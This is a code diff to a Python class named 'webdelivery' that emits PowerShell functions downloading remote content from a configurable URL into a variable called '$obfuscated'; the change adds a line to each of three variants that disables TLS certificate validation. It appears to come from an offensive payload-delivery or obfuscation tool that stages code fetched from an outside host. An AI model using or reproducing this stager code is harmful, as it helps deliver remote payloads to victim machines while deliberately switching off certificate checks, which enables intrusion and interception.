@@ -40,6 +40,7 @@ class webdelivery:
         if self.type == 'bytes':
             return f"""
 function {self.name} {{
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}} ;
     $obfuscated = (New-Object System.Net.WebClient).DownloadData("{self.url}")
     return $obfuscated
 }}
@@ -47,6 +48,7 @@ function {self.name} {{
         elif self.type == 'str':
             return f"""
 function {self.name} {{
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}} ;
     $obfuscated = [System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData("{self.url}"))
     return $obfuscated
 }}
@@ -54,6 +56,7 @@ function {self.name} {{
         elif self.type == 'list':
             return f"""
 function {self.name} {{
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}} ;
     $obfuscated = [System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData("{self.url}")) -split '\\n';
     return $obfuscated;
 }}
